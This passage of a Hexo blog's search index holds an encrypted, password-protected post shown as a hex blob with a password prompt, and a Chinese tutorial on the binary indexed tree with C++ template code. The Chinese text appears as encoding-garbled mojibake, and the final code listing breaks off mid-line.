2e35d6ce7c8e31150545e4d750b32c33157f03616f568abee58c823eacbfc36f8f2018729368d7cf09d97b4b6b4acfc02dcb525a71863ccea4a214ffb6e152429e681f8f6df1093bdc83ba7568d6bd40657e5b86667d0b0a737f3aaf82fbfadbe8574401ccd534217b19397fbf11f4e0eb169df3e91f0fce130282aefb2ce9e409bd3d3ab66bc38136538c974fb664e8e20a5f47e688a2e69994370ee8e47eeb0ef706a90a937d5a652b8abc25d5b6547eaf0bc409413b14d7b0b0c206b45febb6511d10a9c04ef7d17e8e1aa518ff93bf8c84a1fabf67cd3bd7281f07c400d65db67381285f182849766d78e89317dae3b00bc4a5a5da30bc6de56a006a9ed33d5654d0e925a84d107803ba000c20ab745558d6b727a57f5c5a376247485b8df47550f2add1cc651735043bcba559ddf9794798f16350011e44e0f2b04410536141a5e6bd3b1fbca559b5e062a200d454fbfddcccb2a9b7e99292553d1f38a728787ee9a2ac34203fa683983228be8108cd1a6ff242283aa3008fca1102e9803fd0fef6c38dac34c8fb3b05d654001be0f6929ed9efed5ce68a4ec1c99b6d5ae1bd7c7328037c9a6a1a193c20a0ce1102158cbab2203bc0ef43373d364f6ad48b964cf4f1198e3c4949b40ee7a20e2c82b27e63ae1196f82b3e814450d87489ddd983d0f7052225c5c95e426bb720d65153bc4ab150128af722091aa6de891dd033ff703109449ceccf5d5f8c23e46dfada0451aa458ba784992c86911d9e83fb3e5c623953f6a86ad25800fd4ed728ba4a1e28327860c1d08bb0e3269006f34fb2445f122bfe13c9b4e35f8a8a9516c856c006adb550f2ede616a16f3393404da9f39ad724c6ff08e9be7fd56404739a1b9193c3d50d015e9d6d9bf0f35aceb93c39ccfbc4b75a05d5514a65e14a07b27128e31ba110d6adb92660581534c59c8a8b3c8154f00d5920cf15e96630780e1c63121b7fbb40c8bc57a82bf8e2dcb94da5691a80a3c8f36b8ddcda5fd8f908aa73229ed13f37a32ca1986c6b9537dd9df1490d830da4df05d8908c225218f7f3d2a4ffc5bed3f68c2ab391738a352d3d7ec534c9e014898d3d3b54794cae3086b54b0b415bb509b2feffd672eb77dfae4b095f2517b6c6f17743bd3d1733b416e0e5d9d291693179be40b2b9c605109a21d330c2a28b6e0e29e5cdda438a9cb0050482583e80e2bc6a826202ead01ffdb0e0e286cddf3186278374af6a1a244038a8f6e0b7722418ee40461c4eb96933da5c3800a1fea550ec161a2ca551ebfa93518dd594232b22375805cd3e6110a98c00ad08708b5b0c37259ed77daeffba291914c20dba57df450e19ab8a31d7e11bc4bda295fff949085cd7e7fbc75ec2cf32c26e5c8b3e44bb760a8ceff54f3df48978c4b3f949a27b80ff15bca4adef1baf44282b7ba07c265cd9a36f610b9676fcdb6bcd0fb2911a16e7cd78815772d760f8f34c10e5d3cde3cc27558d327d15ae3066ab700e694a97ad35cd52ce19810dbfcb00c60669425f1e76a7453fda9fba9b90172c7253e2a900baf76f0be87b8a0e37d5b0066e3b73bb9525eeb66f856b59e07e42d060d731874cfb1b9bf1ca6706eabc5b4f53dca750d3c0446333ea25faa226c24d29c9ab74290d863cb13dcc4b29f99effd16b6d08b56c086fcb6632fc811d94426c4ecb4785516e4c8a6ce338cbb2daa0866038d67d9c18b3aae57b58a1d1b013cb560bfb339163976c04c99fdce9039ca09006d68c4f42d8b8488e79bd2a95a45c6dbac9064e98e08448eae10e880a941a44932ac11c4c43e93ecce2fc4584a10fd3fa40dbcf1a777022a8174a56c79d92316298824252d81c9988f0f7ed14441e496e6fbe180c00385364b69aaeb20f711c81ecb13c3812b323612ec1f5b644c3c000670be751d0eedab351afc5d5e03b9518a87082b763d79c9e2344695904f69a74e048816e4c190f03f274d76dcae97090e4d21627a342d81ce916117cb15f967785b9a6543bf02e28712e8256b04f940da10e1604f18f802a3c3678b6af3f47b4ea70b47e71443c3278058cf092c6c07b561cb9dd746134280f33675534edb8473b4bf61070ec35155f431b0f41723161888cf0e6c4da4dc7d4abd7989c1fb49354cdbb1a01a05d2eed0f023f577fffdfac057dc30db8fe6de4e52405e018ff94554f3394713fd7c14b79141e46b8159cb274d55d0a00abd71edcc9b55837572b44b9595e19a52b72e23fa93f739053b8c5660e9c567c460c5074853fd4be6c563921a9b07d12f43362caf4ccdb837386027ea3ae083072ce88f36a8bee46ba1679f33916b4265d009ea6031b6859cb85772f7bf786ad2e78a88b67ea69a358ee7e83dae9d9a86896c48b397614e8a4e3344352acd897fb8db77fb4c7295cf4f2d756b6a3289cb4d2b1e60783aa5bfa37e93dd4f4f57ca0ff2fd1e822ab10a0613d1cb7f75ad8446d7e3657caea0071573c69df92b2a14186f40da730e32b8b987a9aee14b6f4da50b86c33fbc1c25aa2904660a1fbdce5af664b65ddcd0614fcc8068d1643505cd41cd0b434d6b43d4b008fa7edf481d08556ca5a05a26b2c6a47419d2e3dd7924ed7b521c827392b5b830d939a70a3d2b9286563328d7acd3ab2ce37a9b2944000de8d0e0977ab7cd8a75cae1c1940abbadce2de6a456ff5c62fa27fda976fecf086a19f810c7df2ad01ec9646065c149d9936886e1c62b07ead46934e59241f4e3892b99638a1bce99afe7cbbd17b8129909dc903eb9ad2b5ab7e83f0ac2c38e6291cfe76529b16decb0170a32c5c3ef0c59501b48668efca0b121da7157b651f4f894860f9913fb185cacf287e74b0472b6598a44a00e59cf01c45361b26586a517db8aebf02ba2c63fb056b6e1c213cc676efd48567207c1e311909552cf5783b08e289db9ce033d7bbe28fd997990c4475a87abc6cf9afe52d9d0c4e425a1b1d558c1f52ad7cc775a7e7c422253d7c015ddbcc5d2718fc134e70f00aa245919165098417b916743a0b946996b8c6285a69c3217383f4a9913cdd763406cf75f0a12fe380f4e71f77476ee4d18df44cdac4dbbfbdedcbb78f822dabfd96841aa2ccd1bf17fdefc631bc3be6c9a3b00c181cbb97b7851f0a4436b06532fb24ab6ee12ee8308ce65a000662333c066b69ee0ea0fc8d642d8c68efb2115c985b62bb8438b396a69a748f2b369744982d31961c83ecb98b6329e72269fb34365fa812c1fda405bc95de1162c511a994291ba03d5b9360a42e1566d5e8e73d577273bfa52185144f753f6f6f396668acc9d8cd4cb7853fe8bac137f79aef501154eef0eeb4207d0f75dcf7327c4c7222f83bf87d8d8aa232e170efca68da30aa44fbffcebc1bc5f6fa471295c44204d588f003a148c0b78747256a4752af509173e13537b80de3762d682220756b5dbdff776aacb868623dfd81942b758f0734404dcf4056b60c8d43ccfd7af1ce7c888f5c4059fa3c3469581ce18a153495bba9c39cfcc5cac527c9f2bf4feeed25ddd9a44fd59f5143da29a52f8c08830e8f10222022396c15b3e85086a06de9d0d4ae636fb180d6add49c42976e9b23d86978bc3cb17b06014d27115c3638d688e7661ad26b027b874464fb39311fb3882e8127decc811ec9705d632174f9458e62ccf85431bd9d51daeaa8b6d672e4cb544294a29401fe4af53b17f600ab56dab39cc87625dd9fffd8d7e5c4344798ec3419e4c46c773bb3ee6b8a0fb182e67ca16f238f70c837f98291998a9d0e4ea81a7dd11a2983cf672069911ce4cee4e85664d5514a107bcff14f7d11b77d43ba9560b8303ca98082c2c587f69e3bd0592c32b73979551cb43a5002dc63ec90261c1bd4693302a5e9faea1f1ba2255249a079bec2c184ccfcdac8340203cd5c1485d40a3a4d3b8189c0a225cc6aeb1a45c217a590e3ca5bf17f22369dc4b83fed801fae506c1c71dee5f5e3a56354a5f187b8e4b8957e8b62fe474ac144ee4543bf208ddf658478a10f58240b4eb443cf043cb32d1ac2a3ac53b95e9b7e21002f19a8fe0ea098818b313d2ef02576f61105fdbad58fea06f35f807da9094b7a1ecd9522b88bc82a848b43706bdee338efe044ae63032d15e167a5a1515272ca98cc02da2e6891d25e76e1d5535bd8fa635537f74c9870527770a37f3ec2960359401ce823469bbef88eeb9472b3f45f88db0c0125012ad4043ae27b5ec27e1110ace99daeddc8812d2726d0092164d9e44a6bd65e315d76e8ebe774684d77813cae0e0b03463d61e7242ef1f85f4ff9ff085a1153ecfaf28020a4692589478ea976dea02d67f789d567d100809580268966149cfbbd59b725c0fc4a1d4f9902994edcd7856a7a6fc8d9f5a054191bc6735a10791a51e10289c304e98f96d3daa864afd3dcab959d505c2b70014de1f15b286c8a13518dff151ab6a6be445ec67767ec04fdc812cb40f0bdb1af176aac76bd1a31b3ac48a361953b76ca1e98a7ca147a126e149b3f51211ba9bf10d16788e72c47e93737e6c6e89a2f8bdd20a0a1f024044e637ff936dcd01474800e49d27b83dd7c764a9b4d43f4ffcbf493313ee15f99f6d2b68f0570127f5fde5627713e3a2e4803819f34b695ee8ac021f88acb8b7ebda209d7a6c4be78b433a514efb3924d737e51eeb56e173079af4cd9a1c15a86f70bf22dd3cbd99cd20816d56611099bef9c72988e949772dc175e0f59305a584bb10d7cbbadc54636377823b375a1b70fdd44cb18b435237555af007285d590bd23b95900d6ccaeee5c9f52fbd03962099034e23ab7692e52c583b17fe2396b09590b4a74310196dba7503115b9ea53ea92c14c9060963a09e99795e7106fd45c7047cb6e9892ad107939b999189dcc85c81e20cd30ca970207d8035fe24e1794068c02eabd784c22514d2cf1f1a05bc7e158997881fdce13b0def39bb3f3f9beec8faad43d9256cd556089afb5cd6a5cf62cc24718c5d321c3d3f0aa9dceeccdf3c4316ab60c5eabb7b24ef966f0f44e43e115e385c27d59699fb4df20c21c0d5ec8b27499a177831f025ada5b18b5907e9e3eebf65fd5a768459ec607b9e89874a07eb2c77a324f9a239a46c1cc18faa590893915ca22cab29b826ab8cbb53b3102fa0c11f5d48074aad0d5744244dbfb5a810e94c2432df5575c43249584c35faec427acc2f74cd74fa0307b2fbc8b4933dfb672f8d787d80e4b4735217db4e0a864b681656bf10c22e7713bf6380cb5762b525a2fe540ab7f936645c3e919882fcde7cbdbad1ecd31e08a54ed4efd3fb9d8dbb21865aded7350193a6eb15fd729d3e43652cff89fb883e778f9636010f8b3557d3cf209638d45e50f67ecd4bcd43dc41488989fe05fa594beea880b1754b17f8658c8f854fdbc27416fa35f3ca298d76ba2198af44d4f257949e41099488011603120055487943d857a66f3119abb3ccbe31a85aafec9cff80b82227f56c199a2e4d64788b98cda8e028bbaf3b01fdcd1c227a54c976389d7bf04a45683cedc09f1cb4a6d76fcebd8294f90db3c3c4e9f934bcb604d9c91c2a2ab0ec6b0851059f3d8898e2a92d945ca18253ece2a82a4eac778cb29dee226158574b5192516633a0ab8d47b1f65f0856150624408522e72659ebc7796e957c62c0bb3d699b78015932c71a47a8efab700fb5365bd34d41b08019de6503efcc66e754b498496aef002249ba5a2a4de22e75de2bab0a2e348c22fbeb0801b5e51f690b29064dae44ecdd871758fc9912b37a2ceb6e30d5fcaa6cb41686bb00f419ae2bc13418fde467ec6e1567144e04c54e5c770ce66e82cc9e81a858855c0e56e8012bd7c1153836dcd503e3cdd3cb5a250e4597a7be29782f4ef53babb455fe59945e84dd38d746a1979394c99cb31f3ce8724bf3976d5acdeb2a7ffea367efe1cc0bae6622882fd0ec96abd2b1f2fe09dc456067cb5206c0b4c478a1006d8b0479048520042d71a712558b762ae83b697a78353a0c4fc5c065451188f058f3a69f15c4ef8c8c3b2c4acb59c99f367b551117b8d7032f6375a0e22b88969495824aa5cf88f8095288d170aef64df90c5a55587efcf1942dbe0a90a41b1f3b77d71f3f6a71f5b9d7e44f4b56974716f476edb25b9984d3cfab46ddea888457b9020d286d57cc9a830f87c2123c665cc511a719b42d49a41cb80a46a6b0b0e345a5dae477827618e94c90c256c3eb121799b4a7749a0c757d271c6f74e5cd72a051ceb4580705dc438d81f5a5c69b1988a30d63e84fa348aa4a95e486ecd889758702c5f50b9ec240770549ac4cb7cae388c8ee60d6acd28a8a5952dbb6008e799f74acd279090119eba60598b4c827bf9619c0e208f8a886e19b6959b4d3c774a11bba05c3481db924c9e667f29ca3954d0008f8c8ee14afbeaf2fd445cadb66402ef1966b727e6ceb2f788827b7735612fec5d17de68b82400a6a1159b495972d068ac31e9ea2ab5f63afbfedb9259c58dc018d2f5bb98f9eb4c77b591c0e8ed3af1b03b0e2b633cbbcdf104a9172c070414542f1a9129db13a5d1e68749bf364b90d89471d34a7afb4bdad94a59f8358eab1277c3db369fa3909abdea56d7390405c3512b419ea79e339c0090a80f15caadaebc7869e0afbfc4811ae763e6ad1f1ce586cf5882bc77804bfa26a49e07233c831e7e79b3150287bb8e1ced980f510cab6a5e1299d6751e1172411410cfeba99db32b65f02348a3c8e147fbc6e7477cea40d137d3b4159338a9116b964107771f33578712754f0cff42b9edadf5c5a507b13333b278bc5c04eaa390406eb5b4fb4c0384d95e3668d7aff2ceb12626b91bbf7d6ff14d11bf22070b0a83a8ddc13e08a774f711102538d18206ab006f82c0c9abefa72a1f8b4b97d6c5a897fc7923dee66a8d6f8e696fe70c542c3bf4e3db1898274434a8568883b9162f699fdfdc04f18ac3d726e8da5768ed15d21b95bfc8d68fcce33640316e2d63dba96759b82c5604afe2e1ff71b9d5c2e94f620f649b1774c42bc37e4f52bd2ad5d390277ae48270f259af03853494945c7cef6b0282facbd4c1ed3f2886cb7b9efbdd9024479006496905687a72ee0d088dfd022641712d64f5f71826456eb2f88ee982c40aadc60849a44968641fc8c03051bd178be1e74bb76da1d0094ecf911595a9a6830225c84ba8309164d3d7b5cdcc5b8b8878a838e5a1c15ddcc53fab0f8325b3abb58cad22d2fa8ca804a87db4c104b788dc92300b045debcd73ed82eeb921cb91bcf46d2e796b6b4ff906cfec64a7d81d67d7acce4a26779a8d3f6811db3cda42465597af299a1682694d1e78355d167282c627749fb9250b50c9d6ab6dd9ca1fc5c22bd5e7087bf7f36903e117d0d14aec5aef4016acbae8d543594656420a6c135cb2ded0144aea78f7076db3bbe04a5d009e6bda6684d1d96a9d33510926b5ae77765e878d41c4b10dfe9383391140254df5e1cc1817e0432a81a6aa7b86a887719419e08aa0436dbec02a8c3044d4c2073db913b8f57ff35e02dd1447d6a1adf8bb8825662792c0682116744b86c21d6ee4e4af0d9ab8c995d70f160fba1e0507b8035535e4e96b914e2c5691d9f695ee9bf7cb2f23e4fa5857b83b2ed3c5f8c8f371540f47621878974b8f3117740d734fb2bf1819b73ecf26e8b8b49b9d587a081eca791e4604dd3e31f77ad0f6f87cd7cea6d4e60df910b60a90d583de4350b8c80ffe18aa00dac2aede9590f2e282e0c11cfa6ee4fdf34ad698f2a707b0b97ac4e20cb8928cc17d827a25aac88f46ab5e9a35d4e7d7568470b9117ccd1043a30ddde08b19e0c6a64a47fea7d6724e2aafe3d4ed5724ac299abc056f5a2105445fe0f7d7174c3b9ac38ff0433e50b2de22779c9df7f87c1ca583f56bb7b81015f2daf213fcd5243a1376ae892294b11ec76a16d825825d98eaa795b69951e7649b8407194b98ca7941cf6874b52ae6196f98b232775e54a34b23cd85ed7a22e1fa5049e1d30cbe845e9924b24f5fd0619f9619575c3343f5d96fb950c8777c7b4f2eb86ea53afb7bc14c79f3d9cad8dee03f4e725a81c57ab56d5cbb196fda00d19ddc8dff1c66df72983c638cefbc8cc468c419b9a3613d43696c666acd752d3faad8f4791c1881fbcd31367963e285e24003fdbac79ff8b5104fd15c248d1569d0429818388cc829c73bf5bf01bf63a05895a3009f1863a957222ae4a1dde488f4dc2a7698363a580150d0bee175e8e5437e9b3797d12e9fbb59d99ccb820fe0fc7091c685374bde7e0554f158cf602cec121ca1e0db8dedb43bd12e5006b18380b4f7bfda50c0a9d70a1a160f11bc82477fcb1e939622d4cbc80d2691b2b8b7ec8415de75a03a217ed0d1b52c2037465831506f96ca10b63698254274bc5b84b3bb504f3cb881c87c4dcbeb9d5e540441b05543e1fc8651b56ea9b016bd6b37bbaa89a35d3a6400cf1fe929da81781b38fa5d5cbec5695a8ace2a000f4fc1b9dfacab3d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ‚¨å¥½ï¼Œè¿™é‡Œéœ€è¦å¯†ç ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> é—²è¨€ç¢è¯­ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‹¤å·¥ä¿­å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘çŠ¶æ•°ç»„å­¦ä¹ </title>
      <link href="/2022/03/23/shu-zhuang-shu-zu-xue-xi/"/>
      <url>/2022/03/23/shu-zhuang-shu-zu-xue-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p><del>åšäº†ä¸€é“å¤§æ°´é¢˜</del>ï¼ŒæŒºæœ‰è¶£çš„ï¼Œåšä¸å‡ºæ¥ç™¾åº¦åˆ°å¯ä»¥ä½¿ç”¨<code>æ ‘çŠ¶æ•°ç»„</code>æˆ–è€…<code>çº¿æ®µæ ‘</code>æ¥è§£ç­”ï¼Œäºæ˜¯é€‰æ‹©äº†å®ç°èµ·æ¥æ¯”è¾ƒç®€å•çš„æ ‘çŠ¶æ•°ç»„æ¥è§£é¢˜ã€‚ä¸€å¼€å§‹æ€è€ƒäº†å¾ˆä¹…ï¼Œæƒ³ä¸é€šä¸ºå•¥å¯ä»¥ä½¿ç”¨æ ‘çŠ¶æ•°ç»„å°±èƒ½è§£å‡ºæ¥ï¼Œé€›äº†ä¼šbç«™å›æ¥å°±æƒ³é€šäº†ï¼ˆ<del>é€†å¤§å¤©</del>ï¼‰ï¼Œåœ¨æ­¤æ„Ÿè°¢<code>xenny</code>å¤§ä½¬çš„<a href="https://www.cnblogs.com/xenny/p/9739600.html">æ ‘çŠ¶æ•°ç»„è¯¦è§£</a>ï¼Œå¸®åŠ©æˆ‘å­¦ä¹ åˆ°äº†ä¸€ä¸ª<code>å…¨æ–°çš„çŸ¥è¯†ç‚¹</code>ğŸ˜‡ã€‚</p><h3 id="æ ‘çŠ¶æ•°ç»„"><a href="#æ ‘çŠ¶æ•°ç»„" class="headerlink" title="æ ‘çŠ¶æ•°ç»„"></a>æ ‘çŠ¶æ•°ç»„</h3><p>å…ˆæ¥è°ˆè°ˆæ ‘çŠ¶æ•°ç»„ï¼šå°±æ˜¯æ‹¿æ•°ç»„æ¥æ¨¡æ‹Ÿæ ‘å½¢çš„ç»“æ„ï¼Œå¯ä»¥è§£å†³å¤§éƒ¨åˆ†åŒºé—´æ›´æ–°ä»¥åŠæ±‚å’Œçš„é—®é¢˜ã€‚  </p><p>å…ˆçœ‹çœ‹å…·ä½“çš„ä¾‹å­ï¼š  </p><p><img src="/images/tree-array.png" class="lazyload placeholder" data-srcset="/images/tree-array.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">  </p><p>çº¢è‰²çš„ä¸º<code>C[i]</code>ï¼Œé»‘è‰²çš„ä¸º<code>A[i]</code>ï¼Œå…³ç³»å¼å¯ä»¥æ¨å‡ºå¦‚ä¸‹ï¼š  </p><ul><li>C[1] &#x3D; A[1];</li><li>C[2] &#x3D; A[1] + A[2];</li><li>C[3] &#x3D; A[3];</li><li>C[4] &#x3D; A[1] + A[2] + A[3] + A[4];</li><li>C[5] &#x3D; A[5];</li><li>C[6] &#x3D; A[5] + A[6];</li><li>C[7] &#x3D; A[7];</li><li>C[8] &#x3D; A[1] + A[2] + A[3] + A[4] + A[5] + A[6] + A[7] + A[8];</li></ul><p>ç„¶åå°±<del>è‡ªç„¶è€Œç„¶</del>å¯ä»¥æ¨å‡ºæ¥ä¸€äº›è§„å¾‹æ€§çš„ä¸œè¥¿ï¼š  </p><p><strong>C[i] &#x3D; A[i - 2^k+1] + A[i - 2^k+2] +â€¦+ A[i];</strong> (å…¶ä¸­kä¸ºå°±æ˜¯ä»æœ€ä½ä½å¼€å§‹ï¼Œ<code>ç¬¬ä¸€ä¸ªä¸º1çš„2çš„æŒ‡æ•°</code>)  </p><p>åˆå®¹æ˜“å¾—å‡º<strong>SUMï¼ˆiï¼‰ &#x3D; C[i] + C[i-2^kï¼ˆ1ï¼‰] + C[(i - 2^kï¼ˆ1ï¼‰) - 2^kï¼ˆ2ï¼‰] + â€¦..ï¼›</strong>(kä»2^0å¼€å§‹å¾€ä¸Šé€’å¢ï¼Œç›´åˆ°c[i]ä¸å­˜åœ¨æ—¶)</p><p>ç„¶åå°±åˆ°äº†ç¬¬ä¸€ä¸ªéš¾ç‚¹ï¼Œæˆ‘ç¬¬ä¸€ä¸ªçœ‹ä¸æ‡‚çš„åœ°æ–¹ï¼š<code> i&amp;(-i);</code>  </p><p>ç¿»é˜…æ ‘çŠ¶æ•°ç»„çš„æ–‡ç« æ—¶æ‰æ˜ç™½æ˜¯<code>å‰äººçš„</code>çš„æ™ºæ…§ã€‚ã€‚ã€‚<code>2^k = i&amp;(-i);</code></p><p><del>å¼€å§‹å·æ‡’å¤åˆ¶ç²˜è´´äº†</del>  </p><p><code>è¿™é‡Œåˆ©ç”¨çš„è´Ÿæ•°çš„å­˜å‚¨ç‰¹æ€§ï¼Œè´Ÿæ•°æ˜¯ä»¥è¡¥ç å­˜å‚¨çš„ï¼Œå¯¹äºæ•´æ•°è¿ç®— x&amp;(-x)æœ‰     â— å½“xä¸º0æ—¶ï¼Œå³ 0 &amp; 0ï¼Œç»“æœä¸º0ï¼›     â—å½“xä¸ºå¥‡æ•°æ—¶ï¼Œæœ€åä¸€ä¸ªæ¯”ç‰¹ä½ä¸º1ï¼Œå–ååŠ 1æ²¡æœ‰è¿›ä½ï¼Œæ•…xå’Œ-xé™¤æœ€åä¸€ä½å¤–å‰é¢çš„ä½æ­£å¥½ç›¸åï¼ŒæŒ‰ä½ä¸ç»“æœä¸º0ã€‚ç»“æœä¸º1ã€‚     â—å½“xä¸ºå¶æ•°ï¼Œä¸”ä¸º2çš„mæ¬¡æ–¹æ—¶ï¼Œxçš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­åªæœ‰ä¸€ä½æ˜¯1ï¼ˆä»å³å¾€å·¦çš„ç¬¬m+1ä½ï¼‰ï¼Œå…¶å³è¾¹æœ‰mä½0ï¼Œæ•…xå–ååŠ 1åï¼Œä»å³åˆ°å·¦ç¬¬æœ‰mä¸ª0ï¼Œç¬¬m+1ä½åŠå…¶å·¦è¾¹å…¨æ˜¯1ã€‚è¿™æ ·ï¼Œx&amp; (-x) å¾—åˆ°çš„å°±æ˜¯xã€‚      â—å½“xä¸ºå¶æ•°ï¼Œå´ä¸ä¸º2çš„mæ¬¡æ–¹çš„å½¢å¼æ—¶ï¼Œå¯ä»¥å†™ä½œx= y * (2^k)ã€‚å…¶ä¸­ï¼Œyçš„æœ€ä½ä½ä¸º1ã€‚å®é™…ä¸Šå°±æ˜¯æŠŠxç”¨ä¸€ä¸ªå¥‡æ•°å·¦ç§»kä½æ¥è¡¨ç¤ºã€‚è¿™æ—¶ï¼Œxçš„äºŒè¿›åˆ¶è¡¨ç¤ºæœ€å³è¾¹æœ‰kä¸ª0ï¼Œä»å³å¾€å·¦ç¬¬k+1ä½ä¸º1ã€‚å½“å¯¹xå–åæ—¶ï¼Œæœ€å³è¾¹çš„kä½0å˜æˆ1ï¼Œç¬¬k+1ä½å˜ä¸º0ï¼›å†åŠ 1ï¼Œæœ€å³è¾¹çš„kä½å°±åˆå˜æˆäº†0ï¼Œç¬¬k+1ä½å› ä¸ºè¿›ä½çš„å…³ç³»å˜æˆäº†1ã€‚å·¦è¾¹çš„ä½å› ä¸ºæ²¡æœ‰è¿›ä½ï¼Œæ­£å¥½å’ŒxåŸæ¥å¯¹åº”çš„ä½ä¸Šçš„å€¼ç›¸åã€‚äºŒè€…æŒ‰ä½ä¸ï¼Œå¾—åˆ°ï¼šç¬¬k+1ä½ä¸Šä¸º1ï¼Œå·¦è¾¹å³è¾¹éƒ½ä¸º0ã€‚ç»“æœä¸º2^kã€‚     æ€»ç»“ä¸€ä¸‹ï¼šx&amp;(-x)ï¼Œå½“xä¸º0æ—¶ç»“æœä¸º0ï¼›xä¸ºå¥‡æ•°æ—¶ï¼Œç»“æœä¸º1ï¼›xä¸ºå¶æ•°æ—¶ï¼Œç»“æœä¸ºxä¸­2çš„æœ€å¤§æ¬¡æ–¹çš„å› å­ã€‚</code></p><p>è€Œä¸”è¿™ä¸ªæœ‰ä¸€ä¸ªä¸“é—¨çš„ç§°å‘¼ï¼Œå«åš<code>lowbit</code>ï¼Œå³å–<code>2^k</code>ã€‚  </p><p>ä¸‹é¢å°±è´´è´´ä»£ç æ¨¡æ¿äº†ï¼š  </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int n,m;int a[50005],c[50005]; &#x2F;&#x2F;å¯¹åº”åŸæ•°ç»„å’Œæ ‘çŠ¶æ•°ç»„int lowbit(int x)&#123;    return x&amp;(-x);&#125;void updata(int i,int k)&#123;    &#x2F;&#x2F;åœ¨iä½ç½®åŠ ä¸Šk    while(i &lt;&#x3D; n)&#123;        c[i] +&#x3D; k;        i +&#x3D; lowbit(i);    &#125;&#125;int getsum(int i)&#123;        &#x2F;&#x2F;æ±‚A[1 - i]çš„å’Œ    int res &#x3D; 0;    while(i &gt; 0)&#123;        res +&#x3D; c[i];        i -&#x3D; lowbit(i);    &#125;    return res;&#125;int main()&#123;    int t;    cin&gt;&gt;t;    for(int tot &#x3D; 1; tot &lt;&#x3D; t; tot++)&#123;        cout &lt;&lt; &quot;Case &quot; &lt;&lt; tot &lt;&lt; &quot;:&quot; &lt;&lt; endl;        memset(a, 0, sizeof a);        memset(c, 0, sizeof c);        cin&gt;&gt;n;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++)&#123;            cin&gt;&gt;a[i];            updata(i,a[i]);   &#x2F;&#x2F;è¾“å…¥åˆå€¼çš„æ—¶å€™ï¼Œä¹Ÿç›¸å½“äºæ›´æ–°äº†å€¼        &#125;        string s;        int x,y;        while(cin&gt;&gt;s &amp;&amp; s[0] !&#x3D; &#39;E&#39;)&#123;            cin&gt;&gt;x&gt;&gt;y;            if(s[0] &#x3D;&#x3D; &#39;Q&#39;)&#123;    &#x2F;&#x2F;æ±‚å’Œæ“ä½œ                int sum &#x3D; getsum(y) - getsum(x-1);    &#x2F;&#x2F;x-yåŒºé—´å’Œä¹Ÿå°±ç­‰äº1-yåŒºé—´å’Œå‡å»1-(x-1)åŒºé—´å’Œ                cout &lt;&lt; sum &lt;&lt; endl;            &#125;            else if(s[0] &#x3D;&#x3D; &#39;A&#39;)&#123;                updata(x,y);            &#125;            else if(s[0] &#x3D;&#x3D; &#39;S&#39;)&#123;                updata(x,-y);    &#x2F;&#x2F;å‡å»æ“ä½œï¼Œå³ä¸ºåŠ ä¸Šç›¸åæ•°            &#125;        &#125;    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…³äºæ ‘çŠ¶æ•°ç»„çš„å˜å½¢ï¼Œæœ‰æ—¶é—´å†å†™å§ï¼ˆ<del>å¯èƒ½ä¸ä¼šå†å†™äº†ï¼Œæ¯•ç«Ÿå°±æ˜¯å­¦è¿™ä¸€æ®µæ—¶é—´</del></p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p><h3 id="åŸé¢˜ç›®"><a href="#åŸé¢˜ç›®" class="headerlink" title="åŸé¢˜ç›®"></a>åŸé¢˜ç›®</h3><p>é¢˜ç›®ç«Ÿç„¶å«ä½œ<code>è¿™æ˜¯ä¸€é“å¤§æ°´é¢˜</code>ï¼Œç„¯ğŸ˜¡</p><p><img src="/images/tree-sum.png" class="lazyload placeholder" data-srcset="/images/tree-sum.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">  </p><p>å¯¹åº”ACçš„ä»£ç ï¼š  </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt; using namespace std;typedef long long ll;ll a[300005],c[300005]&#x3D;&#123;0&#125;;ll n,m;ll result&#x3D;0;inline ll read()&#123;int x&#x3D;0,f&#x3D;1;char ch&#x3D;getchar();    while(ch&lt;&#39;0&#39;||ch&gt;&#39;9&#39;)&#123;if(ch&#x3D;&#x3D;&#39;-&#39;)f&#x3D;-1;ch&#x3D;getchar();&#125;    while(ch&gt;&#x3D;&#39;0&#39;&amp;&amp;ch&lt;&#x3D;&#39;9&#39;)&#123;x&#x3D;x*10+ch-&#39;0&#39;;ch&#x3D;getchar();&#125;    return x*f;&#125;ll lowbit(ll x)&#123;return x&amp;(-x);&#125;void update(ll i,ll value)&#123;while(i&lt;&#x3D;n)&#123;c[i]+&#x3D;value;i+&#x3D;lowbit(i);&#125;&#125;ll getsum(ll i )&#123;ll sum&#x3D;0;while(i&gt;0)&#123;sum+&#x3D;c[i];i-&#x3D;lowbit(i);&#125;return sum;&#125;int main()&#123;n&#x3D;read();m&#x3D;read();while(m--)&#123;ll c;c&#x3D;read();if(c&#x3D;&#x3D;0)&#123;ll left,right,value;left&#x3D;read();right&#x3D;read();value&#x3D;read();ll 